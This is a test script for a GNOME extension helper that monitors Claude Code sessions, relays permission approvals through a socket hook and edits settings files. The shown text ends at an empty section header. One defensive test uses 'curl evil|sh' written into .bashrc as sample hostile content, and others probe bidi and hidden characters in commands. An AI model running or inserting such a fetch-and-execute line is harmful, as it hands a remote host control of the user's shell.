// Self-check for src/helpers/claude.js. Run: gjs -m tests/claude-check.js
// Exits non-zero on the first failure.

import GLib from 'gi://GLib';
import Gio from 'gi://Gio';
import Soup from 'gi://Soup?version=3.0';
import {
    parseSession, procStat, isLive, alertFor, parseUsage, sortSessions, pillDots,
    SETTINGS_PATH, fmtAge, wrapCommand, unwrapCommand, isConnected, connectStatusLine, disconnectStatusLine,
    SOCKET_NAME, approveSocketPath, approveCommand, passThrough, describeRequest, decisionBody,
    isApproveConnected, connectApproveHook, disconnectApproveHook,
    HOOK_TIMEOUT_S, settingsLayout, formatSettings,
    parseNeedsAuth, newAuthNames, parseMcpList, mcpSummary,
    SAFE_MODES, rulesOf, removeRule, setDefaultMode, claudeSettingsFiles, readSettingsAsync, writeSettingsAsync,
    parsePluginList, parseSkillMeta, skillOverride, setSkillOverride, skillSources, parseEnviron, mcpCheckOutcome,
    MANAGED_SETTINGS_PATH, effectiveSkill, skillEdit, remoteAtStartup, setRemoteAtStartup,
    installedEditors, editorApp,
} from '../src/helpers/claude.js';
import { ConfigStore } from '../src/helpers/config.js';

let n = 0;
function ok(cond, what) {
    n++;
    if (!cond) {
        printerr(`FAIL: ${what}`);
        imports.system.exit(1);
    }
}
const eq = (a, b, what) => ok(JSON.stringify(a) === JSON.stringify(b), `${what}: ${JSON.stringify(a)} !== ${JSON.stringify(b)}`);

// ---- parseSession: status mapping ----
const sess = extra => JSON.stringify({ pid: 42, procStart: '367027', cwd: '/home/u/Projetos/NotchNux',
    name: 'notchnux-bf', kind: 'interactive', statusUpdatedAt: 1000, startedAt: 10, ...extra });
eq(parseSession(sess({ status: 'busy' })).state, 'working', 'busy');
eq(parseSession(sess({ status: 'shell' })).state, 'working', 'shell');
eq(parseSession(sess({ status: 'idle' })).state, 'done', 'idle');
for (let w of ['permission prompt', 'sandbox request', 'worker request'])
    eq(parseSession(sess({ status: 'waiting', waitingFor: w })).state, 'approval', w);
for (let w of ['input needed', 'goal proposal', 'dialog open', undefined])
    eq(parseSession(sess({ status: 'waiting', waitingFor: w })).state, 'question', `waiting ${w}`);
let s = parseSession(sess({ status: 'idle' }));
eq([s.pid, s.procStart, s.name, s.folder, s.since], [42, '367027', 'notchnux-bf', 'NotchNux', 1000], 'fields');
eq(parseSession(sess({ name: '', status: 'idle' })).name, 'NotchNux', 'name falls back to folder');
eq(parseSession(sess({ procStart: 367027 })).procStart, '367027', 'numeric procStart');
ok(parseSession(sess({ kind: 'daemon' })) === null, 'daemon skipped');
ok(parseSession(sess({ kind: 'daemon-worker' })) === null, 'daemon-worker skipped');
ok(parseSession('{"pid": 4') === null, 'half-written file');
ok(parseSession('') === null, 'empty file');

// ---- /proc stat + liveness ----
const stat = '72238 (claude code) S 10701 72238 10701 34817 72238 4194304 790550 9708272 1018 1246 11301 985 4650 8596 20 0 36 0 367027 5895725056';
eq(procStat(stat), { ppid: 10701, start: '367027' }, 'procStat with a space in comm');
ok(isLive(s, stat), 'live when start matches');
ok(!isLive({ ...s, procStart: '1' }, stat), 'dead when pid reused');
ok(!isLive(s, null), 'dead when /proc entry missing');

// ---- alertFor ----
const st = state => ({ name: 'x', state });
ok(alertFor(undefined, st('approval')) === null, 'no alert on first sight');
eq(alertFor(st('working'), st('approval')), { state: 'approval', title: 'x', value: 'needs approval' }, 'working→approval');
eq(alertFor(st('working'), st('question')).value, 'has a question', 'working→question');
eq(alertFor(st('working'), st('done')).value, 'finished', 'working→done');
eq(alertFor(st('done'), st('approval')).value, 'needs approval', 'done→approval (missed working step)');
ok(alertFor(st('done'), st('done')) === null, 'done→done');
ok(alertFor(st('question'), st('done')) === null, 'question→done is not "finished"');
ok(alertFor(st('approval'), st('working')) === null, 'approved → no alert');

// ---- parseUsage ----
const now = 1_800_000_000_000;
const usage = JSON.stringify({ rate_limits: {
    five_hour: { used_percentage: 23.5, resets_at: now / 1000 + 3600 },
    seven_day: { used_percentage: 41.2, resets_at: now / 1000 - 1 } } });
eq(parseUsage(usage, now), { fiveHour: { pct: 23.5, resetsAt: now + 3600000 }, weekly: { pct: 0, resetsAt: null } }, 'usage + past reset');
eq(parseUsage(JSON.stringify({ rate_limits: { five_hour: { used_percentage: 5 } } }), now),
    { fiveHour: { pct: 5, resetsAt: null }, weekly: null }, 'missing window');
ok(parseUsage('{"cwd":"/x"}', now) === null, 'no rate_limits');
ok(parseUsage('', now) === null, 'no file');

// ---- ordering + dots ----
const mk = (pid, state, since, startedAt = pid) => ({ pid, state, since, startedAt });
eq(sortSessions([mk(1, 'done', 5), mk(2, 'working', 1), mk(3, 'question', 2), mk(4, 'approval', 3)]).map(x => x.pid),
    [4, 3, 2, 1], 'needs-you first, then working, then done, newest first');
let unseen = new Set([3]);
eq(pillDots([mk(2, 'approval', 0), mk(1, 'working', 0), mk(3, 'done', 0), mk(4, 'done', 0)], unseen),
    [{ kind: 'working', count: 0 }, { kind: 'waiting', count: 0 }, { kind: 'fresh', count: 0 }, { kind: 'done', count: 0 }],
    '4 sessions: one dot each, in start order');
eq(pillDots([mk(1, 'working', 0), mk(2, 'working', 0), mk(3, 'approval', 0), mk(4, 'done', 0), mk(5, 'done', 0)], unseen),
    [{ kind: 'waiting', count: 1 }, { kind: 'working', count: 2 }, { kind: 'done', count: 2 }], '5 sessions collapse to counts');
eq([fmtAge(10000), fmtAge(4 * 60000), fmtAge(125 * 60000)], ['now', '4m', '2h 5m'], 'fmtAge');

// ---- status-line connect / disconnect ----
const ponytail = 'bash "/home/u/.claude/plugins/cache/ponytail/ponytail/4.8.4/hooks/ponytail-statusline.sh"';
const original = { env: { A: '1' }, statusLine: { type: 'command', command: ponytail, padding: 0 }, model: 'opus' };
const text = o => JSON.stringify(o, null, 2) + '\n';
let connected = connectStatusLine(original);
ok(isConnected(connected) && !isConnected(original), 'isConnected');
eq(unwrapCommand(connected.statusLine.command), ponytail, 'original survives quoting');
eq(Object.keys(connected), Object.keys(original), 'key order kept');
eq(connected.statusLine.padding, 0, 'other statusLine keys kept');
eq(connectStatusLine(connected), connected, 'connect is idempotent');
eq(text(disconnectStatusLine(JSON.parse(text(connected)))), text(original), 'round trip restores the file exactly');
let bare = { model: 'opus' };
eq(text(disconnectStatusLine(connectStatusLine(bare))), text(bare), 'no statusLine before → none after');
eq(disconnectStatusLine(original), original, 'disconnect of a foreign command is a no-op');
let tricky = `echo "it's \\"quoted\\"" | cat; printf '%s' $HOME`;
eq(unwrapCommand(wrapCommand(tricky)), tricky, 'quotes, pipes and $ survive');

// ---- approve from the notch: request handling ----
eq(parseSession(sess({ sessionId: 'abc-1', status: 'idle' })).sessionId, 'abc-1', 'sessionId parsed');
eq(parseSession(sess({ status: 'idle' })).sessionId, '', 'no sessionId → empty');
const req = (tool_name, tool_input = {}, extra = {}) => ({ session_id: 'abc-1', cwd: '/home/u/Projetos/NotchNux', tool_name, tool_input, ...extra });
ok(passThrough(req('Bash', {}, { agent_id: 'a1' })), 'subagent prompt goes to the terminal');
for (let t of ['ExitPlanMode', 'AskUserQuestion', 'dialogFoo'])
    ok(passThrough(req(t)), `${t} goes to the terminal`);
ok(!passThrough(req('Bash', { command: 'ls' })), 'main-session Bash is held');
eq(describeRequest(req('Bash', { command: 'npm test' }), 'notchnux-bf'),
    { title: 'notchnux-bf wants to run a command', body: 'npm test', exact: true, always: null }, 'Bash');
eq(describeRequest(req('Edit', { file_path: '/x/src/a.js' }), 'nn'), { title: 'nn wants to edit a.js', body: '/x/src/a.js', exact: false, always: null }, 'Edit');
eq(describeRequest(req('NotebookEdit', { notebook_path: '/x/n.ipynb' }), 'nn').title, 'nn wants to edit n.ipynb', 'NotebookEdit');
eq(describeRequest(req('Read', { file_path: '/etc/hosts' }), 'nn').title, 'nn wants to read hosts', 'Read');
eq(describeRequest(req('WebFetch', { url: 'https://docs.example.com/a?b=1' }), 'nn'),
    { title: 'nn wants to fetch docs.example.com', body: 'https://docs.example.com/a?b=1', exact: true, always: null }, 'WebFetch');
eq(describeRequest(req('mcp__claude_ai_Canva__create-design', { q: 1 }), 'nn'),
    { title: 'nn wants to use claude_ai_Canva · create-design', body: '{"q":1}', exact: true, always: null }, 'MCP tool');
eq(describeRequest(req('Glob', { pattern: '*.js' }), 'nn'), { title: 'nn wants to use Glob', body: '{"pattern":"*.js"}', exact: true, always: null }, 'other tool');
eq(describeRequest(req('Bash', { command: 'ls' })).title, 'NotchNux wants to run a command', 'no session name → folder');
let long = describeRequest(req('Bash', { command: 'a\nb\nc\nd\ne\nf' }), 'nn').body;
eq(long, 'a\nb\nc\nd…', 'body capped at 4 lines');
ok(describeRequest(req('Bash', { command: 'x'.repeat(500) }), 'nn').body.length <= 241, 'body capped at 240 chars');
ok(describeRequest(req('Bash', {}), 'nn').body === '', 'missing command → empty body');
ok(describeRequest(req('Bash', { command: 'npm test' }), 'nn').exact, 'short command shown exactly');
ok(!describeRequest(req('Bash', { command: 'a\nb\nc\nd\ne' }), 'nn').exact, 'clipped command is not exact');
let bidi = describeRequest(req('Bash', { command: 'echo \u202Eabc' }), 'nn');
ok(!bidi.exact && bidi.body === 'echo \uFFFDabc', `bidi override shown as a marker, not exact: ${JSON.stringify(bidi)}`);
ok(!describeRequest(req('Bash', { command: 'echo a\u0007b' }), 'nn').exact, 'control character is not exact');
ok(describeRequest(req('Bash', { command: 'printf "a\tb"' }), 'nn').exact, 'a tab is fine');
ok(describeRequest(req('Bash', { command: 'ls', description: 'list', timeout: 5, run_in_background: false }), 'nn').exact,
    'Bash with harmless extra keys is exact');
ok(!describeRequest(req('Bash', { command: 'ls', dangerouslyDisableSandbox: true }), 'nn').exact, 'an unshown Bash option is not exact');
ok(!describeRequest(req('Write', { file_path: '/h/.bashrc', content: 'curl evil|sh' }), 'nn').exact, 'file content not shown → not exact');
ok(!describeRequest(req('Edit', { file_path: '/x/a.js', old_string: 'a', new_string: 'b' }), 'nn').exact, 'an edit is not exact');
ok(describeRequest(req('Read', { file_path: '/etc/hosts', offset: 1, limit: 5 }), 'nn').exact, 'Read with offset/limit is exact');
ok(describeRequest(req('mcp__s__t', { a: 1 }), 'nn').exact, 'MCP args are shown in full');
for (let ch of ['\u200B', '\u2028', '\u0085', '\u061C', '\uFEFF', '\u{E0041}'])
    ok(!describeRequest(req('Bash', { command: `echo a${ch}b` }), 'nn').exact, `hidden ${JSON.stringify(ch)} is not exact`);
const addR = rules => ({ type: 'addRules', rules, behavior: 'allow', destination: 'localSettings' });
eq(describeRequest(req('Bash', { command: 'npm test' }, { permission_suggestions: [addR([{ toolName: 'Bash', ruleContent: 'npm test:*' }])] }), 'nn').always,
    'Bash(npm test:*)', 'always allow shows the rule it adds');
eq(describeRequest(req('Bash', { command: 'ls' }, { permission_suggestions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }] }), 'nn').always,
    null, 'a mode switch is never offered');
eq(describeRequest(req('Bash', { command: 'ls' }, { permission_suggestions: [addR([{ toolName: 'Edit' }])] }), 'nn').always,
    null, 'a rule for another tool is never offered');
eq(describeRequest(req('Read', { file_path: '/x' }, { permission_suggestions: [addR([{ toolName: 'Read' }])] }), 'nn').always,
    'Read', 'a whole-tool rule shows as the tool');
eq(describeRequest(req('Bash', { command: 'ls' }), 'nn').always, null, 'no suggestions → no always');

const sugg = [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'npm test' }], behavior: 'allow', destination: 'localSettings' }];
const decision = (kind, r) => JSON.parse(decisionBody(kind, r)).hookSpecificOutput;
eq(decision('allow', req('Bash')), { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } }, 'allow');
eq(decision('always', req('Bash', {}, { permission_suggestions: sugg })).decision,
    { behavior: 'allow', updatedPermissions: sugg }, 'always allow carries the suggestions verbatim');
eq(decision('deny', req('Bash')).decision, { behavior: 'deny', message: 'Denied from NotchNux' }, 'deny');
eq(decisionBody('none', req('Bash')), '{}', 'no decision');

// ---- approve from the notch: hook connect / disconnect ----
const sock = '/run/user/1000/notchnux-claude.sock';
ok(approveSocketPath() === `${GLib.get_user_runtime_dir()}/${SOCKET_NAME}`, 'socket in the user runtime dir');
ok(approveCommand(sock).includes("--unix-socket '/run/user/1000/notchnux-claude.sock'") && approveCommand(sock).endsWith('|| true'),
    `hook command: ${approveCommand(sock)}`);
let hooked = connectApproveHook(original, sock);
ok(isApproveConnected(hooked) && !isApproveConnected(original), 'isApproveConnected');
eq(hooked.hooks.PermissionRequest, [{ hooks: [{ type: 'command', command: approveCommand(sock), timeout: 600 }] }], 'hook entry');
eq(text(disconnectApproveHook(JSON.parse(text(hooked)))), text(original), 'no hooks before → exact restore');
eq(connectApproveHook(hooked, sock), hooked, 'connect is idempotent');
let moved = connectApproveHook(hooked, '/run/user/1001/notchnux-claude.sock');
eq([moved.hooks.PermissionRequest.length, moved.hooks.PermissionRequest[0].hooks[0].command], [1, approveCommand('/run/user/1001/notchnux-claude.sock')],
    'reconnect replaces our entry');
const foreign = { model: 'opus', hooks: { PermissionRequest: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'x' }] }],
    Stop: [{ hooks: [{ type: 'command', command: 'y' }] }] }, env: { A: '1' } };
let both = connectApproveHook(foreign, sock);
eq(both.hooks.PermissionRequest.length, 2, 'foreign PermissionRequest hook kept');
eq(text(disconnectApproveHook(JSON.parse(text(both)))), text(foreign), 'foreign hooks → exact restore');
eq(disconnectApproveHook(foreign), foreign, 'disconnect without our hook is a no-op');
eq(text(disconnectApproveHook(connectApproveHook(connectStatusLine(original), sock))), text(connectStatusLine(original)),
    'status line wiring untouched');
ok(HOOK_TIMEOUT_S === 600 && approveCommand(sock).includes(`--max-time ${HOOK_TIMEOUT_S} `), 'curl gives up with the hook');
eq(hooked.hooks.PermissionRequest[0].hooks[0].timeout, HOOK_TIMEOUT_S, 'hook timeout');
const emptyGroup = { hooks: { PermissionRequest: [{ matcher: 'X', hooks: [] }] } };
eq(text(disconnectApproveHook(JSON.parse(text(connectApproveHook(emptyGroup, sock))))), text(emptyGroup),
    'a foreign group that was already empty survives');

// ---- settings.json layout survives Connect / Disconnect ----
for (let [what, raw] of [
    ['2 spaces', '{\n  "model": "opus",\n  "env": {\n    "A": "1"\n  }\n}\n'],
    ['4 spaces', '{\n    "model": "opus",\n    "env": {\n        "A": "1"\n    }\n}\n'],
    ['tabs', '{\n\t"model": "opus"\n}\n'],
    ['one line', '{"model":"opus","env":{"A":"1"}}'],
    ['no trailing newline', '{\n  "model": "opus"\n}'],
]) {
    let layout = settingsLayout(raw);
    eq(formatSettings(JSON.parse(raw), layout), raw, `${what}: rewritten as is`);
    let on = formatSettings(connectApproveHook(JSON.parse(raw), sock), layout);
    eq(formatSettings(disconnectApproveHook(JSON.parse(on)), settingsLayout(on)), raw, `${what}: connect → disconnect exact`);
}
eq(formatSettings({ a: 1 }, settingsLayout(null)), '{\n  "a": 1\n}\n', 'no file yet → Claude Code\'s 2-space layout');
for (let [what, raw] of [['CRLF', '{\r\n  "model": "opus",\r\n  "env": {\r\n    "A": "1"\r\n  }\r\n}\r\n'],
    ['BOM', '\uFEFF{\n  "model": "opus"\n}\n'], ['BOM + CRLF, no newline', '\uFEFF{\r\n\t"model": "opus"\r\n}']]) {
    let layout = settingsLayout(raw);
    let parsed = JSON.parse(raw.replace(/^\uFEFF/, ''));
    eq(formatSettings(parsed, layout), raw, `${what}: rewritten as is`);
    let on = formatSettings(connectApproveHook(parsed, sock), layout);
    eq(formatSettings(disconnectApproveHook(JSON.parse(on.replace(/^\uFEFF/, ''))), settingsLayout(on)), raw, `${what}: connect → disconnect exact`);
}

// ---- MCP health ----
eq(parseSession(sess({ status: 'idle' })).cwd, '/home/u/Projetos/NotchNux', 'session cwd kept');
const authText = JSON.stringify({ 'claude.ai Figma': { timestamp: 100, id: 'x' }, 'plugin:bio-research:wiley': { timestamp: 300 } });
eq([...parseNeedsAuth(authText)], [['claude.ai Figma', 100], ['plugin:bio-research:wiley', 300]], 'auth cache names + times');
eq([...parseNeedsAuth('')], [], 'no auth cache');
ok(parseNeedsAuth('{"a": 4') === null, 'half-written auth cache → null (keep the last one)');
eq(newAuthNames(null, parseNeedsAuth(authText)), [], 'first read: no alert');
eq(newAuthNames(new Map([['claude.ai Figma', 100]]), parseNeedsAuth(authText)), ['plugin:bio-research:wiley'], 'newly needs login');
const mcpOut = [
    'Checking MCP server health…', '',
    'claude.ai Figma: https://mcp.figma.com/mcp (HTTP) - ! Needs authentication',
    'plugin:playwright:playwright: npx @playwright/mcp@latest - ✔ Connected',
    'plugin:bio-research:benchling: https://x (HTTP) - - Not configured',
    'gestor: https://gestor.example/mcp (HTTP) - ✘ Failed to connect — Dynamic Client Registration rejected (HTTP 404): {',
    'odd: sh -c "a - b" - ✔ Connected',
    'waiting: https://y - ⏸ Pending approval',
    'bash: cannot set terminal process group (1): Inappropriate ioctl for device',
    'bash: no job control in this shell', '',
].join('\n');
eq(parseMcpList(mcpOut), [
    { name: 'claude.ai Figma', target: 'https://mcp.figma.com/mcp (HTTP)', status: 'auth', detail: '' },
    { name: 'plugin:playwright:playwright', target: 'npx @playwright/mcp@latest', status: 'ok', detail: '' },
    { name: 'plugin:bio-research:benchling', target: 'https://x (HTTP)', status: 'off', detail: '' },
    { name: 'gestor', target: 'https://gestor.example/mcp (HTTP)', status: 'failed', detail: 'Dynamic Client Registration rejected (HTTP 404): {' },
    { name: 'odd', target: 'sh -c "a - b"', status: 'ok', detail: '' },
    { name: 'waiting', target: 'https://y', status: 'pending', detail: '' },
], 'claude mcp list parsed (plugin names with ":", " - " in a target, shell noise)');
eq(parseMcpList('Checking MCP server health…\n\nNo MCP servers configured.\n'), [], 'no servers');
eq(mcpCheckOutcome(mcpOut, null, false).servers.length, 6, 'check finished: its servers');
eq(mcpCheckOutcome(mcpOut, 'claude mcp list failed', false).servers.length, 6, 'non-zero exit with output: still a check');
eq(mcpCheckOutcome('Checking MCP server health…\n\nNo MCP servers configured.\n', null, false), { servers: [] }, 'no servers is a result');
eq(mcpCheckOutcome(mcpOut, 'claude mcp list took too long', true), { error: 'claude mcp list took too long, so some servers weren\u2019t checked' },
    'timed out: partial output is not a check');
eq(mcpCheckOutcome('', 'claude mcp list failed', false), { error: 'claude mcp list failed' }, 'no output: the error');
eq(mcpCheckOutcome(null, null, false), { error: 'claude mcp list printed nothing' }, 'nothing at all');
let check = { at: 200, servers: parseMcpList(mcpOut) };
let sum = mcpSummary(parseNeedsAuth(authText), check);
eq(sum.problems.map(p => [p.name, p.status]), [['gestor', 'failed'], ['claude.ai Figma', 'auth'],
    ['plugin:bio-research:wiley', 'auth'], ['waiting', 'pending']], 'problems: failed, then login, then pending');
eq(sum.ok.map(s => [s.name, s.target]), [['odd', 'sh -c "a - b"'], ['plugin:playwright:playwright', 'npx @playwright/mcp@latest']],
    'connected servers listed by name, with their target');
eq(sum.off, 1, 'not configured count');
eq(mcpSummary(new Map([['odd', 100]]), check).problems.some(p => p.name === 'odd'), false, 'cache older than a passing check: ok');
let newer = mcpSummary(new Map([['odd', 300]]), check);
eq(newer.problems.find(p => p.name === 'odd'), { name: 'odd', target: 'sh -c "a - b"', status: 'auth', detail: '' },
    'cache newer than the check: needs /mcp, target kept');
eq(newer.ok.some(s => s.name === 'odd'), false, 'and no longer listed as connected');
eq(mcpSummary(parseNeedsAuth(authText), null), { problems: [{ name: 'claude.ai Figma', target: '', status: 'auth', detail: '' },
    { name: 'plugin:bio-research:wiley', target: '', status: 'auth', detail: '' }], ok: [], off: 0 }, 'no check yet: cache only');

// ---- permission rules + default mode ----
const perms = { model: 'opus', permissions: { allow: ['Bash(npm test:*)', 'WebFetch(domain:x.com)'], deny: ['Read(.env)'],
    defaultMode: 'auto' } };
eq(rulesOf(perms), [{ kind: 'deny', rule: 'Read(.env)' }, { kind: 'allow', rule: 'Bash(npm test:*)' },
    { kind: 'allow', rule: 'WebFetch(domain:x.com)' }], 'rules: deny, ask, allow order');
eq(rulesOf({}), [], 'no permissions');
eq(rulesOf({ permissions: { allow: 'x', ask: [3, 'Edit'] } }), [{ kind: 'ask', rule: 'Edit' }], 'junk skipped');
for (let raw of ['{\n  "permissions": {\n    "allow": [\n      "A",\n      "B"\n    ]\n  }\n}\n',
    '{\n    "permissions": {\n        "allow": [\n            "A",\n            "B"\n        ]\n    }\n}\n']) {
    let lay = settingsLayout(raw);
    eq(formatSettings(removeRule(JSON.parse(raw), 'allow', 'A'), lay), raw.replace(/\n +"A",/, ''), `remove a rule, layout kept (${lay.indent.length} spaces)`);
}
eq(removeRule(perms, 'allow', 'gone'), perms, 'removing a missing rule changes nothing');
eq(removeRule({ permissions: { deny: ['X'] } }, 'deny', 'X'), { permissions: { deny: [] } }, 'last rule: empty list kept');
eq(SAFE_MODES, ['default', 'acceptEdits', 'plan', 'auto'], 'safe modes');
eq(setDefaultMode(perms, 'plan').permissions, { ...perms.permissions, defaultMode: 'plan' }, 'set mode');
eq(setDefaultMode({ model: 'x' }, 'acceptEdits'), { model: 'x', permissions: { defaultMode: 'acceptEdits' } }, 'set mode without permissions');
for (let bad of ['bypassPermissions', 'dontAsk', 'manual', '', undefined]) {
    let threw = false;
    try { setDefaultMode(perms, bad); } catch (e) { threw = true; }
    ok(threw, `unsafe mode refused: ${bad}`);
}

// ---- Remote Control for new sessions ----
const rcBase = { model: 'opus', permissions: { defaultMode: 'auto' } };
let rcOn = setRemoteAtStartup(rcBase, true);
eq(rcOn, { ...rcBase, remoteControlAtStartup: true }, 'remote control on');
ok(remoteAtStartup(rcOn) && !remoteAtStartup(rcBase) && !remoteAtStartup({ remoteControlAtStartup: 'yes' }), 'only true counts as on');
eq(JSON.stringify(setRemoteAtStartup(rcOn, false)), JSON.stringify(rcBase), 'on → off restores the file exactly');
ok(setRemoteAtStartup(rcBase, false) === rcBase, 'off when absent: unchanged');
eq(setRemoteAtStartup({ remoteControlAtStartup: false }, false), {}, 'an explicit false goes (same meaning)');

// ---- editors ----
const apps = { 'code.desktop': 'vscode', 'antigravity.desktop': 'ag' };
const lookup = id => apps[id] ?? null;
eq(installedEditors(lookup).map(e => [e.name, e.id]), [['VS Code', 'code.desktop'], ['Antigravity', 'antigravity.desktop']],
    'installed editors, first matching id each');
eq(editorApp('antigravity.desktop', lookup), 'ag', 'the chosen editor');
eq(editorApp('cursor.desktop', lookup), 'vscode', 'chosen one gone: the first installed');
eq(editorApp('', () => null), null, 'no editor at all');
eq(claudeSettingsFiles(['/p/a', '/p/b', '/p/a']).map(f => [f.path, f.scope, f.label]), [
    [SETTINGS_PATH, 'user', 'You · ~/.claude/settings.json'],
    ['/p/a/.claude/settings.json', 'project', 'a · .claude/settings.json'],
    ['/p/a/.claude/settings.local.json', 'local', 'a · .claude/settings.local.json'],
    ['/p/b/.claude/settings.json', 'project', 'b · .claude/settings.json'],
    ['/p/b/.claude/settings.local.json', 'local', 'b · .claude/settings.local.json'],
], 'settings files: user + each live folder once');

// ---- plugins & skills ----
const pluginJson = JSON.stringify([
    { id: 'ponytail@ponytail', enabled: true, scope: 'user', version: '4.8.4', installPath: '/x' },
    { id: 'claude-mem@thedotmack', enabled: false, scope: 'user', version: '1.0' },
    { id: 'harness-mem@chachamaru127', enabled: true, scope: 'project', version: '0.22.2' }]);
eq(parsePluginList(pluginJson), [
    { id: 'claude-mem@thedotmack', name: 'claude-mem', marketplace: 'thedotmack', enabled: false, scope: 'user', version: '1.0' },
    { id: 'harness-mem@chachamaru127', name: 'harness-mem', marketplace: 'chachamaru127', enabled: true, scope: 'project', version: '0.22.2' },
    { id: 'ponytail@ponytail', name: 'ponytail', marketplace: 'ponytail', enabled: true, scope: 'user', version: '4.8.4' },
], 'plugin list parsed, by name');
ok(parsePluginList('not json') === null && parsePluginList('{}') === null, 'bad plugin list → null');
eq(parseSkillMeta('---\nname: fastapi\ndescription: FastAPI best practices.\n---\n\n# FastAPI\n'),
    { name: 'fastapi', description: 'FastAPI best practices.' }, 'skill frontmatter');
eq(parseSkillMeta('---\nname: "quoted"\ndescription: \'single\'\n---\n'), { name: 'quoted', description: 'single' }, 'quoted values');
eq(parseSkillMeta('---\nname: folded\ndescription: >\n  first line\n  second line\nother: x\n---\n'),
    { name: 'folded', description: 'first line second line' }, 'folded description');
eq(parseSkillMeta('# no frontmatter'), { name: '', description: '' }, 'no frontmatter');
eq(parseSkillMeta('---\r\nname: crlf\r\ndescription: Windows lines.\r\n---\r\n'), { name: 'crlf', description: 'Windows lines.' }, 'CRLF frontmatter');
eq(parseSkillMeta('---\nname: chomp\ndescription: >-\n  kept\n  short\n---\n'), { name: 'chomp', description: 'kept short' }, 'folded, stripped (>-)');
eq(parseSkillMeta('---\nname: lit\ndescription: |+\n  a\n  b\n---\n'), { name: 'lit', description: 'a b' }, 'literal, kept (|+)');
eq([skillOverride({}, 'a'), skillOverride({ skillOverrides: { a: 'off' } }, 'a'), skillOverride({ skillOverrides: { a: 'name-only' } }, 'a')],
    ['on', 'off', 'name-only'], 'skill override state');
eq(skillSources(['/p/a', GLib.get_home_dir(), '/p/a', '']).map(x => [x.dir, x.settings, x.where]), [
    [`${GLib.get_home_dir()}/.claude/skills`, SETTINGS_PATH, ''],
    ['/p/a/.claude/skills', '/p/a/.claude/settings.local.json', 'a'],
], 'skill folders: personal once, each other live folder once');
eq(parseEnviron('PATH=/a:/b\0HOME=/h\0EMPTY=\0junk\0'), ['PATH=/a:/b', 'HOME=/h', 'EMPTY='], 'environ parsed');
eq(parseEnviron(''), [], 'no environ');
const sk = { model: 'opus', skillOverrides: { keep: 'name-only' } };
eq(setSkillOverride(sk, 'x', false).skillOverrides, { keep: 'name-only', x: 'off' }, 'skill off');
eq(text(setSkillOverride(setSkillOverride(sk, 'x', false), 'x', true)), text(sk), 'skill off → on restores exactly');
eq(text(setSkillOverride(setSkillOverride({ model: 'opus' }, 'x', false), 'x', true)), text({ model: 'opus' }), 'no overrides before → none after');
eq(setSkillOverride(sk, 'keep', true), { model: 'opus' }, 'turning an override back on drops it');

// ---- which setting decides a skill (Claude Code: policy, local, project, user) ----
ok(MANAGED_SETTINGS_PATH === '/etc/claude-code/managed-settings.json', 'managed settings path');
const ov = v => ({ skillOverrides: { x: v } });
eq(effectiveSkill('x', {}), { state: 'on', scope: null }, 'no override: on');
eq(effectiveSkill('x', { user: ov('off') }), { state: 'off', scope: 'user' }, 'user decides');
eq(effectiveSkill('x', { user: ov('off'), project: ov('on') }), { state: 'on', scope: 'project' }, 'project beats user');
eq(effectiveSkill('x', { user: ov('on'), project: ov('off'), local: ov('name-only') }), { state: 'name-only', scope: 'local' }, 'local beats project');
eq(effectiveSkill('x', { local: ov('on'), policy: ov('off') }), { state: 'off', scope: 'policy' }, 'policy beats everything');
eq(effectiveSkill('x', { user: { skillOverrides: { y: 'off' } } }), { state: 'on', scope: null }, 'other skills ignored');
eq(skillEdit('x', false, 'on')({ a: 1 }), { a: 1, skillOverrides: { x: 'off' } }, 'off writes off');
eq(text(skillEdit('x', true, 'on')(skillEdit('x', false, 'on')({ a: 1 }))), text({ a: 1 }), 'on over nothing below: the override goes (exact)');
eq(skillEdit('x', true, 'off')({ a: 1 }), { a: 1, skillOverrides: { x: 'on' } }, 'on over an off below: writes on');
eq(skillEdit('x', true, 'name-only')({ skillOverrides: { x: 'off' } }), {}, 'on over a still-listed state below: the override goes');

// ---- settings IO, async, on scratch files ----
function settle(promise) {
    let loop = new GLib.MainLoop(null, false), out, err;
    promise.then(v => { out = v; loop.quit(); }, e => { err = e; loop.quit(); });
    loop.run();
    if (err)
        throw err;
    return out;
}
let io = GLib.dir_make_tmp('nn-io-XXXXXX');
const ioRead = p => new TextDecoder().decode(GLib.file_get_contents(p)[1]);
let missing = settle(readSettingsAsync(`${io}/none.json`));
eq([missing.settings, missing.layout, missing.error], [{}, { indent: '  ', eol: '\n', nl: '\n', bom: '' }, undefined], 'missing file → {}');
GLib.file_set_contents(`${io}/empty.json`, '');
eq(settle(readSettingsAsync(`${io}/empty.json`)).settings, {}, 'empty file → {}');
GLib.file_set_contents(`${io}/bom.json`, '\uFEFF{"a": 1}\n');
eq(settle(readSettingsAsync(`${io}/bom.json`)).settings, { a: 1 }, 'BOM ignored when reading');
GLib.file_set_contents(`${io}/bad.json`, '{"a": ');
ok(!!settle(readSettingsAsync(`${io}/bad.json`)).error, 'unparsable → error');
GLib.file_set_contents(`${io}/arr.json`, '[1]');
ok(!!settle(readSettingsAsync(`${io}/arr.json`)).error, 'not an object → error');
const four = '{\n    "permissions": {\n        "allow": [\n            "A"\n        ]\n    }\n}\n';
GLib.file_set_contents(`${io}/real.json`, four);
GLib.spawn_command_line_sync(`ln -s real.json ${GLib.shell_quote(`${io}/link.json`)}`);
let r = settle(readSettingsAsync(`${io}/link.json`));
eq([r.path, r.settings.permissions.allow], [`${io}/real.json`, ['A']], 'symlink followed');
settle(writeSettingsAsync(r.path, removeRule(r.settings, 'allow', 'A'), r.layout, { backup: true }));
eq(ioRead(`${io}/real.json`), four.replace('\n            "A"\n        ', ''), 'written in its own layout');
eq(ioRead(`${io}/real.json~`), four, 'previous file kept as backup');
ok(GLib.file_test(`${io}/link.json`, GLib.FileTest.IS_SYMLINK), 'symlink still a symlink');
let refused = false;
try { settle(writeSettingsAsync(`${io}/new/.claude/settings.json`, { a: 1 }, missing.layout)); } catch (e) { refused = true; }
ok(refused && !GLib.file_test(`${io}/new`, GLib.FileTest.EXISTS), 'never creates folders (every target already exists)');
settle(writeSettingsAsync(`${io}/plain.json`, { a: 1 }, missing.layout));
ok(!GLib.file_test(`${io}/plain.json~`, GLib.FileTest.EXISTS), 'no backup unless asked (it would land in a repo)');
GLib.spawn_command_line_sync(`rm -rf ${GLib.shell_quote(io)}`);

// ---- config: approvals on/off (read-only checks; never saves) ----
